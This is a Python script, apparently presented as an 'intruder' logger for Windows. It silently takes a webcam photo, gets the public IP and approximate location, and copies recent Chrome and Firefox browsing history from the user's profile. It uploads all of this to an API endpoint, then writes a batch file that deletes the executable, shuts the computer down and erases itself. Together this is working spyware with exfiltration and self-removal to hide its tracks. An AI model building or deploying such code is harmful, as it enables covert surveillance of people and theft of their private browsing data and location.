import cv2
import os
import time
from datetime import datetime
import requests
import geocoder
import socket
import json
import sqlite3
import sys
import configparser
import subprocess

folder = "intruder_logs"
os.makedirs(folder, exist_ok=True)

cap = cv2.VideoCapture(0)
ret, frame = cap.read()

if ret:
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(folder, f"intruder_{timestamp}.jpg")
    cv2.imwrite(filename, frame)

    # Collect additional data
    try:
        # Public IP (external, may be VPN)
        public_ip = requests.get('https://api.ipify.org').text
    except Exception as e:
        public_ip = f"Error: {e}"

    try:
        # Local network IP
        local_ip = socket.gethostbyname(socket.gethostname())
    except Exception as e:
        local_ip = f"Error: {e}"

    # Real-time location (approximate via public IP)
    g = geocoder.ip('me')
    if g.ok:
        location_data = {
            'latitude': g.lat,
            'longitude': g.lng,
            'city': g.city,
            'country': g.country
        }
    else:
        location_data = {'error': 'Unable to get location'}

    # Collect browser history
    browser_histories = {'chrome': [], 'firefox': []}

    # Chrome history
    try:
        chrome_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\History')
        temp_chrome = 'temp_chrome.db'
        with open(chrome_path, 'rb') as src, open(temp_chrome, 'wb') as dst:
            dst.write(src.read())
        conn = sqlite3.connect(temp_chrome)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
        browser_histories['chrome'] = [{'url': row[0], 'title': row[1], 'timestamp': row[2]} for row in cursor.fetchall()]
        conn.close()
        os.remove(temp_chrome)
    except Exception as e:
        browser_histories['chrome'] = {'error': str(e)}

    # Firefox history
    try:
        firefox_profile_path = os.path.expanduser(r'~\AppData\Roaming\Mozilla\Firefox')
        profiles_ini = os.path.join(firefox_profile_path, 'profiles.ini')
        config = configparser.ConfigParser()
        config.read(profiles_ini)
        default_profile = None
        for section in config.sections():
            if config.has_option(section, 'Default') and config.get(section, 'Default') == '1':
                default_profile = config.get(section, 'Path')
                break
        if default_profile:
            firefox_history_path = os.path.join(firefox_profile_path, default_profile, 'places.sqlite')
            temp_firefox = 'temp_firefox.db'
            with open(firefox_history_path, 'rb') as src, open(temp_firefox, 'wb') as dst:
                dst.write(src.read())
            conn = sqlite3.connect(temp_firefox)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 10")
            browser_histories['firefox'] = [{'url': row[0], 'title': row[1], 'timestamp': row[2]} for row in cursor.fetchall()]
            conn.close()
            os.remove(temp_firefox)
        else:
            browser_histories['firefox'] = {'error': 'No default profile found'}
    except Exception as e:
        browser_histories['firefox'] = {'error': str(e)}

    extra_data = {
        'public_ip': public_ip,
        'local_ip': local_ip,
        'location': location_data,
        'browser_histories': browser_histories
    }

    # Send the image and data to your API URL
    api_url = 'http://localhost:3000/upload'
    try:
        files = {
            'file': (os.path.basename(filename), open(filename, 'rb')),
            'data': ('data.json', json.dumps(extra_data), 'application/json')
        }
        response = requests.post(api_url, files=files)
        
        if response.status_code == 200:
            print("Data sent successfully. Preparing to delete exe and shut down...")
            # Create a batch file to delete the exe and shutdown
            exe_path = sys.executable  # Path to the running exe (if compiled)
            bat_path = 'delete.bat'
            with open(bat_path, 'w') as f:
                f.write(f'@echo off\ntimeout /t 3 /nobreak >nul\ndel /f /q "{exe_path}"\nshutdown /s /t 0\ndel /f /q "{bat_path}"')
            subprocess.Popen(bat_path, shell=True)
        else:
            print(f"Failed to send data. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending data: {e}")

cap.release()
time.sleep(1)